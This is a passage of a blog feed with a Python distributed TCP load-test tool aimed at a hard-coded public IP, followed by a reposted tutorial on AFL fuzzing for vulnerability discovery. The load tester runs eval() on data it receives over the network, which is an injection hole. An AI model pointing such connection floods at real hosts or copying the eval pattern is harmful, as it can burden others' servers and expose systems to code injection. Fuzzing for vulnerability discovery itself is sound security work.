class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.managers <span class="keyword">import</span> BaseManager</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> freeze_support, Queue</span><br><span class="line"><span class="keyword">from</span> locustTcp <span class="keyword">import</span> locust</span><br><span class="line"></span><br><span class="line"><span class="comment"># 任务个数</span></span><br><span class="line">task_number = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 收发队列</span></span><br><span class="line">task_que = Queue(task_number)</span><br><span class="line">result_queue = Queue(task_number)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_task</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> task_que</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_result</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> result_queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建类似的queueManager</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueueManager</span><span class="params">(BaseManager)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">win_run</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    delay_time_average, delay_time_average_total = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    delay_time_max, delay_time_min, error_times, success_times = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    time_max = []</span><br><span class="line">    time_min = []</span><br><span class="line">    <span class="comment"># 注册在网络上，callable 关联了Queue 对象</span></span><br><span class="line">    <span class="comment"># 将Queue对象在网络中暴露</span></span><br><span class="line">    <span class="comment"># window下绑定调用接口不能直接使用lambda，所以只能先定义函数再绑定</span></span><br><span class="line">    QueueManager.register(<span class="string">'get_task_queue'</span>, callable=get_task)</span><br><span class="line">    QueueManager.register(<span class="string">'get_result_queue'</span>, callable=get_result)</span><br><span class="line">    <span class="comment"># 绑定端口和设置验证口令</span></span><br><span class="line">    manager = QueueManager(address=(<span class="string">'192.168.43.140'</span>, <span class="number">8001</span>), authkey=<span class="string">b'locust'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动管理，监听信息通道</span></span><br><span class="line">    manager.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 通过网络获取任务队列和结果队列</span></span><br><span class="line">        task = manager.get_task_queue()</span><br><span class="line">        result = manager.get_result_queue()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 添加任务</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(task_number):</span><br><span class="line">            n = locust</span><br><span class="line">            task.put(n)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">'try get result...'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(task_number):</span><br><span class="line">            data = result.get(timeout=<span class="number">10000</span>)</span><br><span class="line">            print(<span class="string">'result%d is %s'</span> % (i+<span class="number">1</span>, data))</span><br><span class="line">            data = eval(data)</span><br><span class="line">            print(<span class="string">"平均往返时延(ms): %s 最大时延: %s 最小时延: %s 拒绝连接次数: %s 成功连接数: %s\n"</span> %</span><br><span class="line">                  (data[<span class="number">0</span>], data[<span class="number">2</span>], data[<span class="number">3</span>], data[<span class="number">4</span>], data[<span class="number">5</span>]))</span><br><span class="line">            delay_time_average_total += data[<span class="number">0</span>]</span><br><span class="line">            time_max.append(data[<span class="number">2</span>])</span><br><span class="line">            time_min.append(data[<span class="number">3</span>])</span><br><span class="line">            error_times += data[<span class="number">4</span>]</span><br><span class="line">            success_times += data[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">        delay_time_average = delay_time_average_total/task_number</span><br><span class="line">        delay_time_max = max(time_max)</span><br><span class="line">        delay_time_min = min(time_min)</span><br><span class="line">        print(<span class="string">"最终统计 平均往返时延(ms): %s 最大时延: %s 最小时延: %s 拒绝连接次数: %s 成功连接数: %s\n"</span> %</span><br><span class="line">              (delay_time_average, delay_time_max, delay_time_min, error_times, success_times))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">'Manager error:'</span>, e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        manager.shutdown()</span><br><span class="line">        print(<span class="string">"Work is done"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># window下多进程可能有问题，添加这句话缓解</span></span><br><span class="line">    freeze_support()</span><br><span class="line">    win_run()</span><br></pre></td></tr></table></figure><h2 id="task-worker-py"><a href="#task-worker-py" class="headerlink" title="task_worker.py"></a>task_worker.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing.managers <span class="keyword">import</span> BaseManager</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建类似的QueueManager:</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueueManager</span><span class="params">(BaseManager)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实现第一步：使用QueueManager注册获取Queue的方法名称</span></span><br><span class="line">QueueManager.register(<span class="string">'get_task_queue'</span>)</span><br><span class="line">QueueManager.register(<span class="string">'get_result_queue'</span>)</span><br><span class="line"><span class="comment"># 实现第二步：连接到服务器:</span></span><br><span class="line">server_addr = <span class="string">'192.168.43.140'</span></span><br><span class="line">print(<span class="string">'Connect to server %s...'</span> % server_addr)</span><br><span class="line"><span class="comment"># 端口和验证口令注意保持与服务进程设置的完全一致:</span></span><br><span class="line">m = QueueManager(address=(server_addr, <span class="number">8001</span>), authkey=<span class="string">b'locust'</span>)</span><br><span class="line"><span class="comment"># 从网络连接:</span></span><br><span class="line">m.connect()</span><br><span class="line"><span class="comment"># 实现第三步：获取Queue的对象:</span></span><br><span class="line">task = m.get_task_queue()</span><br><span class="line">result = m.get_result_queue()</span><br><span class="line"><span class="comment"># 实现第四步：从task队列取任务,并把结果写入result队列:</span></span><br><span class="line">task_num = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> task.empty():</span><br><span class="line">    locust = task.get(<span class="keyword">True</span>, timeout=<span class="number">5</span>)  <span class="comment"># 获取任务</span></span><br><span class="line">    task_num += <span class="number">1</span></span><br><span class="line">    a = locust()     <span class="comment"># 执行任务</span></span><br><span class="line">    <span class="comment"># result.put(str(a[-1][1]))  # 传输数据到task_manager</span></span><br><span class="line"></span><br><span class="line">    result.put(str(a[<span class="number">-1</span>][<span class="number">0</span>]))  <span class="comment"># 传输数据到task_manager</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理结束:</span></span><br><span class="line">print(<span class="string">"任务完成个数: %d"</span> % task_num)</span><br><span class="line">print(<span class="string">'worker exit.'</span>)</span><br></pre></td></tr></table></figure><h2 id="locustTcp-py"><a href="#locustTcp-py" class="headerlink" title="locustTcp.py"></a>locustTcp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"122.51.252.101"</span>  <span class="comment"># tcp压力测试ip 122.51.252.101</span></span><br><span class="line">PORT = <span class="number">7474</span></span><br><span class="line">thread_number = <span class="number">1000</span></span><br><span class="line">BUF_SIZE = <span class="number">1024</span></span><br><span class="line">Address = (HOST, PORT)</span><br><span class="line">message = <span class="string">"hello"</span></span><br><span class="line">tcp_connect_data = []</span><br><span class="line">threadLock = threading.Lock()  <span class="comment"># 进程锁</span></span><br><span class="line"><span class="comment"># AF_INET用于不同机器之间的通信 AF_UNIX只能用于本机内进程之间的通信。</span></span><br><span class="line"><span class="comment"># SOCK_STREAM是基于TCP的，数据传输比较有保障。SOCK_DGRAM是基于UDP的，专门用于局域网</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取毫秒级时间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_time_ms</span><span class="params">()</span>:</span></span><br><span class="line">    ct = time.time()    <span class="comment"># 时间戳</span></span><br><span class="line">    local_time = time.localtime(ct)  <span class="comment"># 本地化时间</span></span><br><span class="line">    cart_time_strftime = time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, local_time)  <span class="comment"># 格式化时间</span></span><br><span class="line">    cart_time_strftime_ms = (ct - int(ct)) * <span class="number">1000</span></span><br><span class="line">    ms = <span class="string">"%s.%03d"</span> % (cart_time_strftime, cart_time_strftime_ms)  <span class="comment"># 拼接，获取毫秒级时间</span></span><br><span class="line">    <span class="keyword">return</span> ms, ct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  建立tcp连接</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcp_connect</span><span class="params">()</span>:</span></span><br><span class="line">    error_flag = <span class="number">0</span></span><br><span class="line">    tcp_socket = socket(AF_INET, SOCK_STREAM)  <span class="comment"># 创建socket对象 tcp连接</span></span><br><span class="line">    tcp_socket.settimeout(<span class="number">20</span>)  <span class="comment"># 设置最大连接时间20s</span></span><br><span class="line">    time1 = get_time_ms()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tcp_socket.connect(Address)</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        receive_data = tcp_socket.recv(BUF_SIZE)        </span></span><br><span class="line"><span class="string">        # print(receive_data.decode('utf-8'))</span></span><br><span class="line"><span class="string">        tcp_socket.send(message.encode('utf-8'))  </span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_flag = <span class="number">1</span></span><br><span class="line">        print(<span class="string">"tcpConnError"</span>, e)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    time2 = get_time_ms()</span><br><span class="line">    delay_time = (time2[<span class="number">1</span>] - time1[<span class="number">1</span>])*<span class="number">1000</span></span><br><span class="line">    data = delay_time, error_flag</span><br><span class="line">    tcp_connect_data.append(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, thread_id)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.threadId = thread_id</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        threadLock.acquire()  <span class="comment"># 获取锁，用于线程同步</span></span><br><span class="line">        tcp_connect()</span><br><span class="line">        threadLock.release()  <span class="comment"># 释放锁，开启下一个线程</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(self.threadId)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">locust</span><span class="params">()</span>:</span></span><br><span class="line">    test_thread = MyThread(<span class="number">0</span>)</span><br><span class="line">    test_thread.start()</span><br><span class="line">    test_thread.join()</span><br><span class="line">    delay_time_max = tcp_connect_data[test_thread.threadId][<span class="number">0</span>]  <span class="comment"># 初始化最大时延和最小时延</span></span><br><span class="line">    delay_time_min = delay_time_max</span><br><span class="line">    error_times, success_times, total_time = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>     <span class="comment"># 初始化连接数</span></span><br><span class="line">    threads = []</span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, thread_number+<span class="number">1</span>):</span><br><span class="line">        t = MyThread(i)</span><br><span class="line">        threads.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        <span class="comment"># t.setDaemon(True)  # 把多线程设置为守护线程</span></span><br><span class="line">        t.start()  <span class="comment"># 开始执行多线程</span></span><br><span class="line">        <span class="comment"># t.info()</span></span><br><span class="line">        t.join()  <span class="comment"># 等待线程执行完成</span></span><br><span class="line">        delay_time = tcp_connect_data[t.threadId][<span class="number">0</span>]</span><br><span class="line">        error_flag = tcp_connect_data[t.threadId][<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> delay_time_max &lt; delay_time:  <span class="comment"># 更新最大时延和最小时延</span></span><br><span class="line">            delay_time_max = delay_time</span><br><span class="line">        <span class="keyword">if</span> delay_time_min &gt; delay_time:</span><br><span class="line">            delay_time_min = delay_time</span><br><span class="line">        total_time += delay_time</span><br><span class="line">        delay_time_average = total_time/t.threadId</span><br><span class="line">        error_times += error_flag</span><br><span class="line">        success_times = t.threadId - error_times</span><br><span class="line">        print(<span class="string">"%s 执行时间为 %s\n"</span> % (t, get_time_ms()[<span class="number">0</span>]))  <span class="comment"># 输出执行时间</span></span><br><span class="line">        print(<span class="string">"平均往返时延(ms): %s 本次时延: %s 最大时延: %s 最小时延: %s 拒绝连接次数: %s 成功连接数: %s\n"</span> %</span><br><span class="line">              (delay_time_average, delay_time, delay_time_max, delay_time_min, error_times, success_times))</span><br><span class="line">        thread_data = (delay_time_average, delay_time, delay_time_max, delay_time_min, error_times, success_times), t</span><br><span class="line">        data.append(thread_data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    locust()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;task-manager-py&quot;&gt;&lt;a href=&quot;#task-manager-py&quot; class=&quot;headerlink&quot; title=&quot;task_manager.py&quot;&gt;&lt;/a&gt;task_manager.py&lt;/h2&gt;&lt;figure class=&quot;highli
      
    
    </summary>
    
      <category term="python" scheme="https://nocbtm.github.io/categories/python/"/>
    
    
      <category term="python" scheme="https://nocbtm.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>AFL漏洞挖掘</title>
    <link href="https://nocbtm.github.io/2019/11/12/AFL%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <id>https://nocbtm.github.io/2019/11/12/AFL漏洞挖掘/</id>
    <published>2019-11-12T12:02:02.000Z</published>
    <updated>2019-12-26T12:34:50.552Z</updated>
    
    <content type="html"><![CDATA[<p>转载于 ：<a href="https://www.freebuf.com/articles/system/191543.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/191543.html</a></p><h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一 前言"></a>一 前言</h2><p>模糊测试（Fuzzing）技术作为漏洞挖掘最有效的手段之一，近年来一直是众多安全研究人员发现漏洞的首选技术。AFL、LibFuzzer、honggfuzz等操作简单友好的工具相继出现，也极大地降低了模糊测试的门槛。</p><p><img alt="" data-src="https://i.loli.net/2019/11/17/gpEyeKHY6JqSQPz.jpg" class="lozad"></p><h2 id="二-AFL简介"><a href="#二-AFL简介" class="headerlink" title="二 AFL简介"></a>二 AFL简介</h2><p>AFL（American Fuzzy Lop）是由安全研究员Michał Zalewski（@lcamtuf）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。其工作流程大致如下：</p><ul><li><p>①从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）；</p></li><li><p>②选择一些输入文件，作为初始测试集加入输入队列（queue）；</p></li><li><p>③将队列中的文件按一定的策略进行“突变”；</p></li><li><p>④如果经过变异文件更新了覆盖范围，则将其保留添加到队列中;</p></li><li><p>⑤上述过程会一直循环进行，期间触发了crash的文件会被记录下来。</p></li></ul><p><img alt="" data-src="https://i.loli.net/2019/11/17/26iNMIudQhyRXpG.jpg" class="lozad"></p><h2 id="三-选择和评估测试的目标"><a href="#三-选择和评估测试的目标" class="headerlink" title="三 选择和评估测试的目标"></a>三 选择和评估测试的目标</h2><p>开始Fuzzing前，首先要选择一个目标。 AFL的目标通常是接受外部输入的程序或库，输入一般来自文件（也可以Fuzzing一个网络程序）。</p><ol><li><p>用什么语言编写<br>AFL主要用于C/C++程序的测试，所以这是我们寻找软件的最优先规则。（也有一些基于AFL的JAVA Fuzz程序如kelinci、java-afl等）</p></li><li><p>是否开源<br>AFL既可以对源码进行编译时插桩，也可以使用AFL的QEMU mode对二进制文件进行插桩，但是前者的效率相对来说要高很多，在Github上很容易就能找到很多合适的项目。</p></li><li><p>程序版本<br>目标应该是该软件的最新版本，不然辛辛苦苦找到一个漏洞，却发现早就被上报修复了就尴尬了。</p></li><li><p>是否有示例程序、测试用例<br>如果目标有现成的基本代码示例，特别是一些开源的库，可以方便我们调用该库不用自己再写一个程序；如果目标存在测试用例，那后面构建语料库时也省事儿一点。</p></li><li><p>项目规模<br>某些程序规模很大，会被分为好几个模块，为了提高Fuzz效率，在Fuzzing前，需要定义Fuzzing部分。这里推荐一下源码阅读工具Understand，它treemap功能，可以直观地看到项目结构和规模。</p></li><li>程序曾出现过漏洞<br>如果某个程序曾曝出过多次漏洞，那么该程序有仍有很大可能存在未被发现的安全漏洞。</li></ol><h2 id="四-构建语料库"><a href="#四-构建语料库" class="headerlink" title="四 构建语料库"></a>四 构建语料库</h2><p>AFL需要一些初始输入数据（也叫种子文件）作为Fuzzing的起点，这些输入甚至可以是毫无意义的数据，AFL可以通过启发式算法自动确定文件格式结构。lcamtuf就在博客中给出了一个有趣的例子——对djpeg进行Fuzzing时，仅用一个字符串”hello”作为输入，最后凭空生成大量jpge图像！</p><p>尽管AFL如此强大，但如果要获得更快的Fuzzing速度，那么就有必要生成一个高质量的语料库，这一节就解决如何选择输入文件、从哪里寻找这些文件、如何精简找到的文件三个问题。</p><h3 id="1-选择"><a href="#1-选择" class="headerlink" title="1. 选择"></a>1. 选择</h3><p>(1) 有效的输入</p><p>尽管有时候无效输入会产生bug和崩溃，但有效输入可以更快的找到更多执行路径。</p><p>(2) 尽量小的体积</p><p>较小的文件会不仅可以减少测试和处理的时间，也能节约更多的内存，AFL给出的建议是最好小于1 KB，但其实可以根据自己测试的程序权衡，这在AFL文档的perf_tips.txt中有具体说明。</p><h3 id="2-寻找"><a href="#2-寻找" class="headerlink" title="2. 寻找"></a>2. 寻找</h3><p>使用项目自身提供的测试用例</p><p>目标程序bug提交页面</p><p>使用格式转换器，用从现有的文件格式生成一些不容易找到的文件格式：</p><p>afl源码的testcases目录下提供了一些测试用例</p><p>其他开源的语料库</p><h3 id="3-修剪"><a href="#3-修剪" class="headerlink" title="3. 修剪"></a>3. 修剪</h3><p>网上找到的一些大型语料库中往往包含大量的文件，这时就需要对其精简，这个工作有个术语叫做——语料库蒸馏（Corpus Distillation）。AFL提供了两个工具来帮助我们完成这部工作——afl-cmin和afl-tmin。<br>(1) 移除执行相同代码的输入文件——afl-cmin</p><p>afl-cmin的核心思想是：尝试找到与语料库全集具有相同覆盖范围的最小子集。举个例子：假设有多个文件，都覆盖了相同的代码，那么就丢掉多余的文件。其使用方法如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params]</span><br></pre></td></tr></table></figure></p><p>更多的时候，我们需要从文件中获取输入，这时可以使用“@@”代替被测试程序命令行中输入文件名的位置。Fuzzer会将其替换为实际执行的文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@</span><br></pre></td></tr></table></figure></p><p>(2) 减小单个输入文件的大小——afl-tmin<br>整体的大小得到了改善，接下来还要对每个文件进行更细化的处理。afl-tmin缩减文件体积的原理这里就不深究了，有机会会在后面文章中解释，这里只给出使用方法（其实也很简单，有兴趣的朋友可以自己搜一搜）。</p><p>afl-tmin有两种工作模式，instrumented mode和crash mode。默认的工作方式是instrumented mode<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-tmin -i input_file -o output_file -- /path/to/tested/program [params] @@</span><br></pre></td></tr></table></figure></p><p>如果指定了参数-x，即crash mode，会把导致程序非正常退出的文件直接剔除。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-tmin -x -i input_file -o output_file -- /path/to/tested/program [params] @@</span><br></pre></td></tr></table></figure><p>afl-tmin接受单个文件输入，所以可以用一条简单的shell脚本批量处理。如果语料库中文件数量特别多，且体积特别大的情况下，这个过程可能花费几天甚至更长的时间！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> *; <span class="keyword">do</span> afl-tmin -i <span class="variable">$i</span> -o tmin-<span class="variable">$i</span> -- ~/path/to/tested/program [params] @@; <span class="keyword">done</span>;s</span><br></pre></td></tr></table></figure><h2 id="五-构建被测试程序"><a href="#五-构建被测试程序" class="headerlink" title="五 构建被测试程序"></a>五 构建被测试程序</h2><p>前面说到，AFL从源码编译程序时进行插桩，以记录代码覆盖率。这个工作需要使用其提供的两种编译器的wrapper编译目标程序，和普通的编译过程没有太大区别</p><h3 id="1-afl-gcc模式"><a href="#1-afl-gcc模式" class="headerlink" title="1. afl-gcc模式"></a>1. afl-gcc模式</h3><p>afl-gcc/afl-g++作为gcc/g++的wrapper，它们的用法完全一样，前者会将接收到的参数传递给后者，我们编译程序时只需要将编译器设置为afl-gcc/afl-g++就行，如下面演示的那样。如果程序不是用autoconf构建，直接修改Makefile文件中的编译器为afl-gcc/g++也行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./configure CC=<span class="string">"afl-gcc"</span> CXX=<span class="string">"afl-g++"</span></span><br></pre></td></tr></table></figure><p>在Fuzzing共享库时，可能需要编写一个简单demo，将输入传递给要Fuzzing的库（其实大多数项目中都自带了类似的demo）。这种情况下，可以通过设置LD_LIBRARY_PATH让程序加载经过AFL插桩的.so文件，不过最简单的方法是静态构建，通过以下方式实现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./configure --<span class="built_in">disable</span>-shared CC=<span class="string">"afl-gcc"</span> CXX=<span class="string">"afl-g++"</span></span><br></pre></td></tr></table></figure><h3 id="2-LLVM模式"><a href="#2-LLVM模式" class="headerlink" title="2. LLVM模式"></a>2. LLVM模式</h3><p>LLVM Mode模式编译程序可以获得更快的Fuzzing速度，进入llvm_mode目录进行编译，之后使用afl-clang-fast构建序程序即可，如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> llvm_mode$ apt-get install clang$ <span class="built_in">export</span> LLVM_CONFIG=`<span class="built_in">which</span> llvm-config` &amp;&amp; make &amp;&amp; <span class="built_in">cd</span> ..$ ./configure --<span class="built_in">disable</span>-shared CC=<span class="string">"afl-clang-fast"</span> CXX=<span class="string">"afl-clang-fast++"</span></span><br></pre></td></tr></table></figure><p>在使用高版本的clang编译时可能会报错，换成clang-3.9后通过编译，如果你的系统默认安装的clang版本过高，可以安装多个版本然后使用update-alternatives切换。</p><h2 id="六-开始Fuzzing"><a href="#六-开始Fuzzing" class="headerlink" title="六 开始Fuzzing"></a>六 开始Fuzzing</h2><h3 id="1-白盒测试"><a href="#1-白盒测试" class="headerlink" title="1. 白盒测试"></a>1. 白盒测试</h3><h4 id="1-测试插桩程序"><a href="#1-测试插桩程序" class="headerlink" title="(1) 测试插桩程序"></a>(1) 测试插桩程序</h4><p>编译好程序后，可以选择使用afl-showmap跟踪单个输入的执行路径，并打印程序执行的输出、捕获的元组（tuples），tuple用于获取分支信息，从而衡量衡量程序覆盖情况，下一篇文章中会详细的解释，这里可以先不用管。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-showmap -m none -o /dev/null -- ./build/bin/imagew 23.bmp out.png[*] Executing <span class="string">'./build/bin/imagew'</span>...-- Program output begins --23.bmp -&gt; out.pngProcessing: 13x32-- Program output ends --[+] Captured 1012 tuples <span class="keyword">in</span> <span 